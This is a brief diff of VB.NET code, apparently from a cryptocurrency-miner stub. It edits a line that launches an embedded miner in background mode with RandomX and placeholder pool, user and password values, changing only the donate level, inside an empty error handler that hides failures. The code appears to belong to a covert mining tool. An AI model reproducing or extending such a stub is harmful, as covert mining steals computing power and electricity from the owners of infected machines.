@@ -119,7 +119,7 @@ Public Class Program
             End If
 
 
-Run(GetTheResource("#dll"), "-B --donate-level=5 -a RandomX --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
+Run(GetTheResource("#dll"), "-B --donate-level=1 -a RandomX --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
         Catch ex As Exception
         End Try
     End Sub
